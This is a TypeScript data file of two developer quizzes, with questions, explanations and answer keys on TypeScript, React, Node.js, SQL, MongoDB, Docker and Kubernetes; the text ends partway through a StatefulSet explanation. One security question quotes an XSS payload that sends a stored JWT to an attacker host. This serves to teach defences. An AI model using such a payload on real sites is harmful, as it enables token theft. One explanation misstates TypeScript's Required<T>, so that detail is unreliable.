export type Answer = {
  answer: string;
  isCorrect: boolean;
};

export type Question = {
  question: string;
  explanation: string;
  answers: Answer[];
};

export type Quiz = {
  name: string;
  questions: Question[];
};

export const quizes: Quiz[] = [
  {
    name: "Quiz 1",
    questions: [
      {
        question: `What does the following TypeScript conditional type evaluate to?

\`\`\`typescript
type Unpack<T> = T extends (...args: any[]) => infer R ? R : never;
type Result = Unpack<() => Promise<string>>;
\`\`\``,
        explanation: `The \`infer\` keyword inside a conditional type's \`extends\` clause lets TypeScript capture and name a type that it infers at evaluation time. Here, \`infer R\` captures whatever the function returns. Because \`() => Promise<string>\` returns \`Promise<string>\`, TypeScript binds \`R = Promise<string>\` and the whole type resolves to \`Promise<string>\`.

It does **not** unwrap the Promise — that would require composing with \`Awaited<T>\`. The \`never\` branch is only reached when \`T\` is not a function type at all. This pattern is exactly how TypeScript's built-in \`ReturnType<T>\` utility is implemented in \`lib.es5.d.ts\`.`,
        answers: [
          { answer: "`Promise<string>`", isCorrect: true },
          { answer: "`string`", isCorrect: false },
          { answer: "`never`", isCorrect: false },
          { answer: "`any`", isCorrect: false },
        ],
      },
      {
        question: `A child component is wrapped in \`React.memo\`. Which of the following prop-passing patterns will cause it to **unnecessarily re-render** on every parent render?

\`\`\`tsx
function Parent() {
  const [count, setCount] = React.useState(0);

  // Option A
  const handleA = () => console.log('clicked');

  // Option B
  const handleB = React.useCallback(() => console.log('clicked'), []);

  return (
    <>
      <button onClick={() => setCount(c => c + 1)}>Increment</button>
      <MemoChild onAction={/* handleA or handleB */} />
    </>
  );
}
\`\`\``,
        explanation: `\`React.memo\` performs a **shallow comparison** of props using \`Object.is\`. Functions are objects, and every time \`Parent\` renders, \`handleA\` is recreated as a brand-new function object — a different reference each render. \`Object.is(prevHandleA, nextHandleA)\` is always \`false\`, so \`MemoChild\` re-renders on every parent render despite the memoization wrapper.

\`useCallback\` solves this by returning a **stable reference** across renders as long as its dependency array doesn't change. \`handleB\`'s reference is the same object on every render (since the deps array is empty), so \`MemoChild\`'s prop comparison passes and the re-render is skipped.

The same problem applies to object literals and arrays passed as props — \`const options = { size: 'lg' }\` defined inside a render function creates a new reference every time.`,
        answers: [
          {
            answer: "Passing `handleA` — a callback defined inline without `useCallback`",
            isCorrect: true,
          },
          {
            answer: "Passing `handleB` — a `useCallback`-wrapped callback with an empty dependency array",
            isCorrect: false,
          },
          {
            answer: "Passing a string constant as a prop",
            isCorrect: false,
          },
          {
            answer: "Passing a number derived from `useState`",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Consider the following Node.js script:

\`\`\`javascript
setTimeout(() => console.log('setTimeout'), 0);
setImmediate(() => console.log('setImmediate'));
Promise.resolve().then(() => console.log('Promise'));
process.nextTick(() => console.log('nextTick'));
\`\`\`

Ignoring the non-deterministic ordering between \`setTimeout\` and \`setImmediate\`, which two callbacks are **always** guaranteed to run before \`setImmediate\`?`,
        explanation: `Node.js processes two special queues before advancing to the next event loop phase:

1. **Next tick queue** (\`process.nextTick\`): drained completely before anything else — even before Promise microtasks.
2. **Microtask queue** (resolved Promises / \`queueMicrotask\`): drained after the next tick queue is empty.

Only after both queues are empty does Node.js move to the next event loop phase. \`setImmediate\` runs in the **check phase** — after I/O polling — making it the last of the group to execute.

The relative order of \`setTimeout(fn, 0)\` vs \`setImmediate\` is non-deterministic when both are queued from the main module, because which phase runs first depends on OS scheduling jitter. Inside an I/O callback, \`setImmediate\` is guaranteed to fire before \`setTimeout(fn, 0)\`.`,
        answers: [
          {
            answer: "`process.nextTick` and resolved Promise callbacks",
            isCorrect: true,
          },
          {
            answer: "`setTimeout` and `process.nextTick`",
            isCorrect: false,
          },
          {
            answer: "Resolved Promise callbacks and `setTimeout`",
            isCorrect: false,
          },
          {
            answer: "`setTimeout` and `setImmediate`",
            isCorrect: false,
          },
        ],
      },
      {
        question: `What is the output of the following JavaScript code?

\`\`\`javascript
function makeCounter(initial = 0) {
  let count = initial;
  return {
    increment() { return ++count; },
    decrement() { return --count; },
    value()     { return count; },
  };
}

const a = makeCounter(10);
const b = makeCounter(10);

a.increment();
a.increment();
b.decrement();

console.log(a.value(), b.value());
\`\`\``,
        explanation: `Each call to \`makeCounter\` creates a new **execution context** with its own \`count\` variable. The three returned methods form a **closure** over that specific \`count\` — they hold a live reference to the variable in the scope where they were created, not a copy of its value.

\`a\` and \`b\` are completely independent: each closes over a separate \`count\` initialized to \`10\`. Calling \`a.increment()\` twice raises \`a\`'s count to \`12\`. Calling \`b.decrement()\` once lowers \`b\`'s count to \`9\`. Neither operation affects the other.

This pattern — using closures to encapsulate mutable private state — is the **Module Pattern**, one of the foundational JavaScript design patterns predating ES6 classes and still commonly used in functional codebases.`,
        answers: [
          { answer: "`12 9`", isCorrect: true },
          { answer: "`12 11`", isCorrect: false },
          { answer: "`11 9`", isCorrect: false },
          { answer: "`12 12`", isCorrect: false },
        ],
      },
      {
        question: `Your team horizontally shards a PostgreSQL users table by \`user_id\` across 8 shards. A new feature requires looking up a user by \`email\` address (unique, but not the shard key). What happens when this query executes, and what is the standard mitigation?

\`\`\`sql
SELECT * FROM users WHERE email = 'alice@example.com';
\`\`\``,
        explanation: `When a table is sharded by a key, the routing layer uses that key to direct queries to exactly one shard. A query on a **non-shard-key column** provides no routing information — the system cannot know which shard holds the row without inspecting all of them. The result is a **scatter-gather (fan-out) query**: the query is broadcast to every shard, each returns its matches, and the coordinator merges the results. At 8 shards this is manageable; at hundreds of shards it becomes a serious bottleneck.

The standard mitigation is a **lookup table**: a small, unsharded table that maps \`email → user_id\`. The application first queries the lookup table to resolve the \`user_id\`, then issues a routed single-shard query. AWS DynamoDB's Global Secondary Indexes and Vitess's VSchema implement this pattern at the infrastructure level. Another option is to maintain a search index (e.g., Elasticsearch) for non-key lookups.`,
        answers: [
          {
            answer: "The query fan-outs to all 8 shards (scatter-gather). The standard fix is a separate `email → user_id` lookup table to enable routed single-shard lookups.",
            isCorrect: true,
          },
          {
            answer: "The query is automatically routed to the shard holding the matching email, since the database adapts when a unique index exists.",
            isCorrect: false,
          },
          {
            answer: "The query fails with an error — non-shard-key lookups are forbidden by the routing layer.",
            isCorrect: false,
          },
          {
            answer: "The query hits only shard 0 and returns an empty result if the user lives on a different shard.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Your Node.js API sets the following HTTP response header. An attacker injects \`<script>alert(document.cookie)</script>\` into server-rendered HTML. Which directive blocks execution, and why does adding \`'unsafe-inline'\` to \`script-src\` completely defeat the policy?

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\``,
        explanation: `**\`script-src 'self'\`** is the operative directive. It tells the browser to only execute scripts that originate from the same origin as the document — this blocks inline \`<script>\` tags and inline event handlers (\`onclick="..."\`) entirely, which are the primary XSS delivery mechanisms.

Adding **\`'unsafe-inline'\`** to \`script-src\` re-enables all inline script execution. Since XSS attacks inject inline code, allowing \`'unsafe-inline'\` makes the entire CSP useless against XSS.

The modern alternative is a **nonce-based CSP**: the server generates a cryptographically random nonce per request, includes \`'nonce-<value>'\` in \`script-src\`, and adds \`nonce="<value>"\` to every legitimate \`<script>\` tag. Injected scripts won't carry the correct nonce and are blocked. A **hash-based** approach (\`'sha256-<hash>'\`) works similarly for static inline scripts. Both strategies allow specific inline scripts without enabling arbitrary inline execution.`,
        answers: [
          {
            answer: "`script-src 'self'` blocks the injected inline script. Adding `'unsafe-inline'` re-enables all inline scripts and completely undermines the XSS protection.",
            isCorrect: true,
          },
          {
            answer: "`default-src 'self'` blocks the script; `script-src` only applies to external script files, not inline tags.",
            isCorrect: false,
          },
          {
            answer: "Neither directive blocks inline scripts by default — you must explicitly add `script-src 'none'`.",
            isCorrect: false,
          },
          {
            answer: "`script-src 'self'` blocks the script, and `'unsafe-inline'` is only dangerous for cross-origin scripts, not same-origin injections.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Given the query below, what rank values does \`RANK()\` assign when two employees in the same department share the highest salary? How does this differ from \`DENSE_RANK()\`?

\`\`\`sql
SELECT
  name,
  department,
  salary,
  RANK()       OVER (PARTITION BY department ORDER BY salary DESC) AS rnk,
  DENSE_RANK() OVER (PARTITION BY department ORDER BY salary DESC) AS dense_rnk
FROM employees;
\`\`\``,
        explanation: `**\`RANK()\`** assigns the same rank to tied rows, then **skips** subsequent ranks by the number of ties. Two employees tied for first both receive rank \`1\`, and the next distinct salary receives rank \`3\` — rank \`2\` is skipped. Think of it like an Olympic podium: two gold medalists, no silver, then bronze.

**\`DENSE_RANK()\`** also assigns the same rank to tied rows but **never skips** ranks. The same two tied employees get rank \`1\`, and the next employee gets rank \`2\` regardless of the tie count.

Practical guidance:
- Use \`RANK()\` when you need to know "how many rows rank above this one" (including peers) — useful for leaderboards where gaps convey meaning.
- Use \`DENSE_RANK()\` when you want a compact, gap-free ranking — e.g., "return the top 3 distinct salary levels per department."
- \`ROW_NUMBER()\` assigns a unique sequential integer to every row and breaks ties arbitrarily — use it when you need exactly one result per position.`,
        answers: [
          {
            answer: "`RANK()` gives both tied employees rank `1` and skips rank `2`, so the next employee gets rank `3`. `DENSE_RANK()` gives rank `1` then `2` with no gap.",
            isCorrect: true,
          },
          {
            answer: "`RANK()` assigns consecutive ranks with no gaps — it is identical to `DENSE_RANK()`.",
            isCorrect: false,
          },
          {
            answer: "`RANK()` arbitrarily assigns rank `1` to one tied employee and rank `2` to the other to ensure uniqueness.",
            isCorrect: false,
          },
          {
            answer: "`RANK()` returns `NULL` for tied rows and requires an explicit tie-breaker column in `ORDER BY`.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `In MongoDB, you are modeling a blog platform. Each post has comments; comments are **always** fetched together with their parent post, and no post will ever exceed a few hundred comments. Which data modeling strategy is correct, and why would the reference pattern cause problems here?`,
        explanation: `**Embed comments as an array inside the post document.** MongoDB's document model is optimized around one principle: *data that is accessed together should be stored together*. When comments are always read with their post and the count is bounded, a single \`db.posts.findOne({ _id })\` retrieves the complete post-with-comments — no join, no second round-trip, and the result fits comfortably within MongoDB's 16 MB document limit.

The **reference pattern** (comments in a separate collection linked by \`post_id\`) adds unnecessary complexity in this scenario: you must use a \`$lookup\` aggregation stage (MongoDB's join) or issue two queries in the application, both of which hurt read performance without any benefit when comments are always co-read with the post.

The reference pattern is the right choice when:
- Comment counts are unbounded (risk of hitting the 16 MB document limit).
- Comments must be queried independently, paginated at scale, or shared across parents.
- Concurrent writes to a single post document create lock contention.

A common mistake is applying relational normalization instincts to MongoDB. The correct rule is to **model for your access patterns**, not for normalization.`,
        answers: [
          {
            answer: "Embed comments as an array within the post document — data accessed together should be stored together, and bounded size makes a single-document read safe and efficient.",
            isCorrect: true,
          },
          {
            answer: "Store comments in a separate collection with a `post_id` reference — normalization prevents data duplication and is always preferred.",
            isCorrect: false,
          },
          {
            answer: "Store arrays of comment `_id` references inside the post document, then batch-fetch comments in a second query.",
            isCorrect: false,
          },
          {
            answer: "Duplicate comments in both the post document and a standalone collection to optimize both read paths simultaneously.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The following Dockerfile builds a Node.js API. A developer notices that every source code change — even a one-line edit in \`src/index.ts\` — causes \`npm ci\` to re-run, adding 90 seconds to every build. What is the root cause, and what change fixes it?

\`\`\`dockerfile
FROM node:22-alpine
WORKDIR /app
COPY . .
RUN npm ci
RUN npm run build
CMD ["node", "dist/index.js"]
\`\`\``,
        explanation: `Docker builds images layer by layer and **caches each layer**. A layer is invalidated — and all subsequent layers rebuild from scratch — whenever its instruction or the files it depends on change. In this Dockerfile, \`COPY . .\` copies the entire source tree (including \`src/\`, \`package.json\`, \`package-lock.json\`, and everything else) into one layer. Any file change invalidates that layer, forcing \`npm ci\` to re-run every time.

The fix is to copy only the dependency manifests first, install dependencies, then copy the rest of the source:

\`\`\`dockerfile
FROM node:22-alpine
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build
CMD ["node", "dist/index.js"]
\`\`\`

Now the \`npm ci\` layer is only invalidated when \`package.json\` or \`package-lock.json\` actually change. Source-only edits hit the cache for the install step and only rebuild the \`COPY . .\` and \`npm run build\` layers — reducing incremental build time from 90 seconds to a few seconds. This is one of the highest-impact Dockerfile optimizations for development velocity.`,
        answers: [
          {
            answer: "`COPY . .` copies all source files before `npm ci`, so any file change invalidates the install layer. Fix: copy only `package.json`/`package-lock.json`, run `npm ci`, then copy the full source.",
            isCorrect: true,
          },
          {
            answer: "The `node:22-alpine` base image doesn't support layer caching. Switching to `node:22` enables it.",
            isCorrect: false,
          },
          {
            answer: "`npm ci` always deletes and reinstalls `node_modules` regardless of cache. Replace it with `npm install --prefer-offline` to use the cache.",
            isCorrect: false,
          },
          {
            answer: "Merging `RUN npm ci` and `RUN npm run build` into a single `RUN` instruction with `&&` would eliminate the cache invalidation.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Kubernetes Deployment has both a **liveness probe** and a **readiness probe** configured. The application takes 20 seconds to start up, but the liveness probe begins checking at second 5 with a \`failureThreshold\` of 3 and \`periodSeconds\` of 5. What happens, and how should the probes be correctly configured?`,
        explanation: `**Liveness probe failure** signals to Kubernetes that the container is stuck or unrecoverable — Kubernetes kills and restarts it per the pod's \`restartPolicy\`. With a \`failureThreshold\` of 3 and \`periodSeconds\` of 5, the liveness probe declares the container dead at second 20 (5s start + 3×5s). Since the app needs exactly 20 seconds to start, the container gets killed just as it would be finishing startup, creating a **crash loop**.

**Readiness probe failure** is gentler: Kubernetes removes the pod from the Service's endpoint list (stopping new traffic), but does not restart the container. This is the appropriate behavior during startup.

The correct solution uses a **\`startupProbe\`**: while the startup probe is failing, liveness and readiness probes are completely suspended. Only after the startup probe succeeds do the other probes activate. Configure it with a generous budget:

\`\`\`yaml
startupProbe:
  httpGet:
    path: /healthz
    port: 8080
  failureThreshold: 30
  periodSeconds: 2   # 60-second startup budget
livenessProbe:
  httpGet:
    path: /healthz
    port: 8080
  periodSeconds: 10
readinessProbe:
  httpGet:
    path: /ready
    port: 8080
  periodSeconds: 5
\`\`\`

This gives the app a 60-second startup window without affecting the tighter runtime health checking cadence.`,
        answers: [
          {
            answer: "Kubernetes kills the container in a crash loop before it finishes starting. Fix: add a `startupProbe` with a generous `failureThreshold` to suspend liveness/readiness checking during startup.",
            isCorrect: true,
          },
          {
            answer: "Kubernetes removes the pod from Service endpoints but does not restart it, so the app eventually finishes starting and traffic resumes automatically.",
            isCorrect: false,
          },
          {
            answer: "Both probes are suspended until the container's main process signals readiness via a lifecycle hook, so a 20-second startup has no effect.",
            isCorrect: false,
          },
          {
            answer: "Kubernetes scales up a replacement pod and terminates the slow pod only after the replacement passes its readiness probe.",
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "Quiz 2",
    questions: [
      {
        question: `What does the \`-readonly\` modifier do in the following TypeScript mapped type, and what is the equivalent built-in utility type?

\`\`\`typescript
type User = {
  readonly id: number;
  readonly name: string;
  readonly email: string;
};

type Mutable<T> = {
  -readonly [K in keyof T]: T[K];
};

type MutableUser = Mutable<User>;
\`\`\``,
        explanation: `In TypeScript mapped types, the \`+\` and \`-\` prefixes are **modifier operators** that add or remove property modifiers. \`-readonly\` removes the \`readonly\` modifier from every property, producing a fully mutable version of the type. The resulting \`MutableUser\` is equivalent to writing \`{ id: number; name: string; email: string; }\` by hand.

Similarly, \`-?\` removes the optional (\`?\`) marker — this is exactly how TypeScript's built-in \`Required<T>\` utility is implemented in \`lib.es5.d.ts\`:
\`\`\`typescript
type Required<T> = { -readonly [K in keyof T]-?: T[K]; };
\`\`\`

The \`+\` prefix is optional: \`+readonly\` and \`readonly\` are identical. TypeScript's built-in \`Readonly<T>\` adds the modifier, and \`Partial<T>\` adds \`?\`. There is no built-in \`Mutable<T>\` — it's a common custom utility you'll often see in codebases that need to temporarily work with immutable types.`,
        answers: [
          {
            answer: "It removes the `readonly` modifier from each property, making them all writable. There is no built-in equivalent — `Mutable<T>` is a common custom utility.",
            isCorrect: true,
          },
          {
            answer: "It makes every property both `readonly` and optional. The built-in equivalent is `Partial<Readonly<T>>`.",
            isCorrect: false,
          },
          {
            answer: "It is a syntax error — TypeScript mapped types do not support modifier removal; you must retype each property manually.",
            isCorrect: false,
          },
          {
            answer: "It marks every property as deprecated. The `-` prefix is an alias for the `@deprecated` JSDoc annotation in mapped types.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The following React component has a subtle bug. What is it, and what is the cleanest fix?

\`\`\`tsx
function Counter() {
  const [count, setCount] = React.useState(0);

  React.useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1);
    }, 1000);
    return () => clearInterval(id);
  }, []);

  return <div>{count}</div>;
}
\`\`\``,
        explanation: `The \`setInterval\` callback is created **once** (because of the empty dependency array \`[]\`) and **closes over** the value of \`count\` at that moment: \`0\`. Every second it computes \`0 + 1 = 1\` and calls \`setCount(1)\`. After the first tick, \`count\` is already \`1\`, so React bails out of re-rendering (same state value) and the counter is stuck at \`1\` forever. This is the classic **stale closure** bug.

The cleanest fix is the **functional updater form**:
\`\`\`tsx
setCount(c => c + 1);
\`\`\`
The updater receives the *current* state value as its argument at call time, completely bypassing the closed-over stale variable. You could also add \`count\` to the dependency array, but that restarts the interval on every tick — wasteful and potentially jittery. The functional updater solves the problem at the root without any side effects.`,
        answers: [
          {
            answer: "Stale closure: `count` is captured as `0` forever, so the counter gets stuck at `1`. Fix: use the functional updater form `setCount(c => c + 1)`.",
            isCorrect: true,
          },
          {
            answer: "There is no bug — the empty dependency array is correct and `useEffect` re-evaluates closures automatically on each render.",
            isCorrect: false,
          },
          {
            answer: "The `clearInterval` call in the cleanup function stops the interval after the first render, so the counter never increments past `0`.",
            isCorrect: false,
          },
          {
            answer: "The bug is that `useState` is initialized to `0` instead of `null` — numeric initial state causes `setInterval` to behave incorrectly.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A distributed NoSQL database is described as **AP** (Available and Partition-tolerant). According to the CAP theorem, what consistency guarantee does it sacrifice, and what does "eventual consistency" mean in practice for an application reading user profile data?`,
        explanation: `The **CAP theorem** (Brewer's theorem) states that a distributed system can guarantee at most two of three properties simultaneously:
- **C**onsistency: every read returns the most recent write (or an error)
- **A**vailability: every request receives a (non-error) response, even if it may be stale
- **P**artition tolerance: the system keeps operating when network partitions split nodes

Since real distributed systems cannot eliminate network partitions, the practical trade-off is between **CP** (consistent under partition, may return errors) and **AP** (available under partition, may return stale data).

**AP databases** (Cassandra, DynamoDB, CouchDB) prioritize staying responsive over returning the most recent value. During a network partition, different replicas may accept writes independently and diverge. After the partition heals, the nodes reconcile via anti-entropy processes and converge on the same value. This is **eventual consistency** — a read may return a stale profile picture for a few seconds after an update, but all replicas will eventually agree.

For user profile reads this is usually acceptable. For inventory deductions or bank balances where two stale reads can both permit an operation that should be rejected, AP systems require application-level conflict resolution (e.g., last-write-wins, CRDTs, or read-your-own-writes routing).`,
        answers: [
          {
            answer: "It sacrifices strong consistency. Reads may return stale data during a partition. 'Eventual consistency' means all replicas will converge to the same value after the partition heals, but there is no guarantee of seeing the latest write immediately.",
            isCorrect: true,
          },
          {
            answer: "It sacrifices partition tolerance — AP databases are only deployed in single-datacenter environments where network splits cannot occur.",
            isCorrect: false,
          },
          {
            answer: "It sacrifices availability — AP systems return errors on reads during a partition to avoid serving stale data.",
            isCorrect: false,
          },
          {
            answer: "The CAP theorem only applies to SQL databases; NoSQL databases like Cassandra operate outside its constraints by using gossip protocols.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Two concurrent database transactions both execute the following logic against a \`READ COMMITTED\` isolation level. The initial account balance is \$1,000.

\`\`\`sql
-- Transaction A and Transaction B run simultaneously:

-- Step 1: both check the balance
SELECT balance FROM accounts WHERE id = 42;  -- both see $1,000

-- Step 2: both confirm $1,000 >= $800, then debit
UPDATE accounts SET balance = balance - 800 WHERE id = 42;
COMMIT;
\`\`\`

What problem occurs, and what is the standard SQL fix?`,
        explanation: `This is the **check-then-act race condition** (a form of write skew). Both transactions read the same balance (\$1,000) before either commits. Both pass the "sufficient funds" check (\$1,000 ≥ \$800) and both execute the debit. The final balance is \$1,000 − \$800 − \$800 = **−\$600** — an overdraft that the check should have prevented.

\`READ COMMITTED\` only prevents reading *uncommitted* dirty data — it does not prevent two transactions from both reading the same pre-update value before either writes.

**Standard fixes:**

1. **\`SELECT ... FOR UPDATE\`**: acquires a row-level exclusive lock at read time. Transaction B's \`SELECT ... FOR UPDATE\` blocks until A commits. B then re-reads \$200 and can correctly abort.

2. **Atomic conditional UPDATE**:
\`\`\`sql
UPDATE accounts SET balance = balance - 800
WHERE id = 42 AND balance >= 800;
-- check rows affected: if 0, insufficient funds
\`\`\`
This collapses the check and update into a single atomic operation that the database serializes.

3. **\`SERIALIZABLE\` isolation**: the database detects the read-write conflict and aborts one transaction automatically.`,
        answers: [
          {
            answer: "Both transactions read $1,000 before either commits, so both consider the debit valid and execute it — resulting in a -$600 balance. Fix: use `SELECT ... FOR UPDATE` to lock the row at read time, or use a single atomic conditional `UPDATE ... WHERE balance >= 800`.",
            isCorrect: true,
          },
          {
            answer: "`READ COMMITTED` prevents this race — Transaction B blocks on the `UPDATE` until Transaction A commits, then re-reads the updated balance of $200 and automatically aborts.",
            isCorrect: false,
          },
          {
            answer: "The `UPDATE` uses `balance - 800` which is applied to the latest committed value, so the database correctly serializes both debits and the final balance is $200.",
            isCorrect: false,
          },
          {
            answer: "This is a phantom read, which only occurs in `SELECT` queries with range conditions — point lookups like `WHERE id = 42` are immune.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `What does the following functional TypeScript code output?

\`\`\`typescript
const pipe = <T>(...fns: Array<(arg: T) => T>) => (x: T): T =>
  fns.reduce((v, f) => f(v), x);

const double  = (n: number) => n * 2;
const addTen  = (n: number) => n + 10;
const square  = (n: number) => n * n;

const transform = pipe(double, addTen, square);
console.log(transform(3));
\`\`\`

And how does \`pipe\` differ from \`compose\`?`,
        explanation: `\`pipe\` applies functions **left-to-right** using \`reduce\`, starting with the initial value \`x\`:

1. \`double(3)\` → \`6\`
2. \`addTen(6)\` → \`16\`
3. \`square(16)\` → \`256\`

Output: **\`256\`**

\`compose\` applies functions in the opposite order — **right-to-left** (like mathematical function composition: \`f∘g∘h(x) = f(g(h(x)))\`). The equivalent \`compose(double, addTen, square)(3)\` would compute \`square(3)=9 → addTen(9)=19 → double(19)=38\`.

In practice, \`pipe\` is more readable because the data flows in the same direction as your eye reads the code. Libraries like Ramda and fp-ts provide both. TypeScript's strict generic inference makes typing \`pipe\` for heterogeneous function chains (where output types differ between steps) require function overloads — the version above works only when all functions share the same type \`T\`.`,
        answers: [
          {
            answer: "`256`. `pipe` applies functions left-to-right: `double(3)=6 → addTen(6)=16 → square(16)=256`. `compose` applies right-to-left, the opposite order.",
            isCorrect: true,
          },
          {
            answer: "`38`. `pipe` applies functions right-to-left: `square(3)=9 → addTen(9)=19 → double(19)=38`.",
            isCorrect: false,
          },
          {
            answer: "`676`. `pipe` sorts the functions by arity before applying them, so `addTen` runs first: `addTen(3)=13 → double(13)=26 → square(26)=676`.",
            isCorrect: false,
          },
          {
            answer: "`36`. `pipe` with `reduce` applies only the first two functions; the third is used as the accumulator's initial value.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The following TypeScript code demonstrates a classic OOP design flaw. What does \`testArea\` print for a \`Square\`, and which SOLID principle does the \`Square extends Rectangle\` hierarchy violate?

\`\`\`typescript
class Rectangle {
  constructor(protected width: number, protected height: number) {}
  setWidth(w: number)  { this.width = w; }
  setHeight(h: number) { this.height = h; }
  area() { return this.width * this.height; }
}

class Square extends Rectangle {
  setWidth(w: number)  { this.width = w;  this.height = w; }
  setHeight(h: number) { this.width = h;  this.height = h; }
}

function testArea(rect: Rectangle) {
  rect.setWidth(4);
  rect.setHeight(5);
  console.log(rect.area());
}

testArea(new Rectangle(0, 0)); // 20
testArea(new Square(0, 0));    // ???
\`\`\``,
        explanation: `**Output for \`Square\`: \`25\`.**

\`setWidth(4)\` sets both dimensions to 4. Then \`setHeight(5)\` overwrites both dimensions to 5 — the earlier width assignment is silently discarded. Area = 5 × 5 = **25**, not the expected 20.

This violates the **Liskov Substitution Principle (LSP)** — the "L" in SOLID. LSP states: *if S is a subtype of T, then objects of type T may be replaced with objects of type S without altering any of the desirable properties of the program*. Here, substituting a \`Square\` for a \`Rectangle\` breaks the implicit invariant that \`setWidth\` and \`setHeight\` operate independently.

The real-world lesson: **inheritance should model "is-a" in terms of behavior, not just shape**. A square *is* a rectangle geometrically, but it does not *behave* like a \`Rectangle\` in this API. The fix is to avoid the inheritance and instead use separate classes (possibly sharing an interface like \`Shape\`) or make \`Rectangle\` and \`Square\` both immutable value objects where side-effecting setters don't exist.`,
        answers: [
          {
            answer: "`25`. `setHeight(5)` overwrites the width set by `setWidth(4)`, so both dimensions end up as 5. This violates the **Liskov Substitution Principle** — a Square cannot be substituted for a Rectangle without breaking the program's expected behavior.",
            isCorrect: true,
          },
          {
            answer: "`20`. Square inherits Rectangle's setters and behaves identically, so testArea produces the same result for both. No SOLID principle is violated.",
            isCorrect: false,
          },
          {
            answer: "`16`. Square forces width = height throughout, so after both setters run, each dimension is 4 (the last consistent state). This violates the Open/Closed Principle.",
            isCorrect: false,
          },
          {
            answer: "A TypeError is thrown because TypeScript prevents instantiating a subclass that overrides parent methods with different behavior at runtime.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Your Node.js API handles CPU-intensive image resizing on uploaded files. Under load, the event loop becomes blocked and all other requests stall. A teammate suggests wrapping the resize function in \`async/await\`. Why does this not solve the problem, and what is the correct approach?`,
        explanation: `**\`async/await\` only helps with I/O-bound work.** When you \`await\` a Promise that wraps a non-blocking I/O operation (a network call, a file read via \`fs.promises\`), the underlying call is handed to the OS, Node.js is free to process other events, and the callback resumes when I/O completes. No CPU is consumed while waiting.

CPU-bound work — tight loops, image processing, cryptography — runs continuously on the main thread and never yields, regardless of whether it's wrapped in a Promise or \`await\`-ed. Adding \`async\` to a synchronous function that burns CPU just wraps its return value in a Promise; it does not make the execution non-blocking.

**The correct solutions:**

1. **\`worker_threads\`** (preferred for CPU-bound tasks within the same process): spawn a \`Worker\` for each image operation. Each worker runs on a separate OS thread with its own V8 isolate, processing images in parallel without blocking the event loop. Data is exchanged via \`postMessage\` / \`SharedArrayBuffer\`.

2. **Child processes** (\`child_process.fork\`): spawn a separate Node.js process. Higher overhead than threads but full isolation — useful for untrusted code or large memory footprints.

3. **Offload to a queue + worker service** (architecturally cleanest at scale): publish resize jobs to a message queue (BullMQ, SQS) and process them in a separate dedicated service.`,
        answers: [
          {
            answer: "`async/await` only yields the event loop during I/O waits — CPU-bound work never yields regardless of how it's wrapped. The correct fix is to offload the image processing to a `worker_threads` Worker, which runs on a separate OS thread.",
            isCorrect: true,
          },
          {
            answer: "Wrapping the resize function in `async/await` schedules it as a microtask, which runs at lower priority than I/O callbacks and prevents event loop starvation.",
            isCorrect: false,
          },
          {
            answer: "Using `setImmediate(() => resizeImage(...))` defers the work to the next event loop iteration, allowing other callbacks to interleave and preventing blocking.",
            isCorrect: false,
          },
          {
            answer: "Node.js automatically moves CPU-intensive Promises to a libuv thread pool (the same pool used for file I/O), so `async/await` is sufficient.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `An attacker successfully injects the following XSS payload into your web application. The app stores its JWT in \`localStorage\`.

\`\`\`javascript
fetch('https://attacker.com/steal?t=' + localStorage.getItem('auth_token'));
\`\`\`

What is exfiltrated, and what storage mechanism prevents this entire class of attack?`,
        explanation: `The complete JWT is exfiltrated to the attacker's server. With a valid JWT the attacker can impersonate the user for the token's entire lifetime — there is typically no server-side session state to invalidate. This is the fundamental risk of storing authentication tokens in \`localStorage\` (or \`sessionStorage\`): **any JavaScript running on the page has full read access to it**, including injected scripts.

**HttpOnly cookies** prevent this attack. A cookie with the \`HttpOnly\` flag set is inaccessible to JavaScript — \`document.cookie\` does not include it, and \`localStorage\` / \`sessionStorage\` APIs are unrelated. The browser automatically attaches the cookie to same-origin requests, but no script (including injected XSS payloads) can read or exfiltrate it.

The complete secure cookie configuration for a JWT:
\`\`\`
Set-Cookie: auth_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/
\`\`\`
- \`HttpOnly\`: no JS access
- \`Secure\`: HTTPS only
- \`SameSite=Strict\`: CSRF protection — cookie is not sent on cross-origin requests

The trade-off: HttpOnly cookies require the same origin for API calls (or careful CORS configuration). SPAs talking to a separate API domain often need a \`SameSite=None; Secure\` cookie with a strict CORS allowlist — still far safer than \`localStorage\`.`,
        answers: [
          {
            answer: "The full JWT is stolen and can be used to impersonate the user. `HttpOnly` cookies prevent this — JavaScript cannot read `HttpOnly` cookies, so the XSS payload cannot exfiltrate the token.",
            isCorrect: true,
          },
          {
            answer: "Only the JWT header and payload are readable; the signature is never stored in `localStorage`, so the attacker cannot forge requests.",
            isCorrect: false,
          },
          {
            answer: "The `fetch` request is blocked by the browser's Same-Origin Policy (SOP) because the destination domain differs from the app's origin.",
            isCorrect: false,
          },
          {
            answer: "Nothing is exfiltrated — `localStorage` is sandboxed per tab and cannot be accessed by dynamically injected scripts.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `You need to deploy a 3-node MongoDB replica set on Kubernetes. Each node requires:
- A stable, predictable DNS name (\`mongo-0\`, \`mongo-1\`, \`mongo-2\`)
- Its own dedicated persistent volume that survives pod restarts and rescheduling

Which Kubernetes workload resource should you use, and why is a \`Deployment\` insufficient for this use case?`,
        explanation: `Use a **StatefulSet**. StatefulSets are designed specifically for stateful workloads that require stable identities and dedicated storage:

